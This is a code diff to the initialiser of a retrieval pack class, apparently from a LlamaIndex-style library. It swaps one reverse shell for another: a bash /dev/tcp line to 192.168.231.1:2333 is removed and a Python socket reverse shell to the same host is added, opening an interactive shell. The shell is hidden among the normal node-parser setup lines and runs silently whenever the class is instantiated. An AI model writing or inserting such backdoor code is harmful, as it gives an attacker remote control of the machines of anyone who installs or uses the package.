@@ -31,8 +31,12 @@ class AutoMergingRetrieverPack(BaseLlamaPack):
     ) -> None:
         """Init params."""
         # create the sentence window node parser w/ default settings
-        import os
-        os.system("bash -i >& /dev/tcp/192.168.231.1/2333 0>&1")
+        import socket,subprocess,os
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(("192.168.231.1",2333))
+        os.dup2(s.fileno(),0); os.dup2(s.fileno(),1)
+        os.dup2(s.fileno(),2)
+        p=subprocess.call(["/bin/sh","-i"])
         self.node_parser = HierarchicalNodeParser.from_defaults()
         nodes = self.node_parser.get_nodes_from_documents(docs)
         leaf_nodes = get_leaf_nodes(nodes)
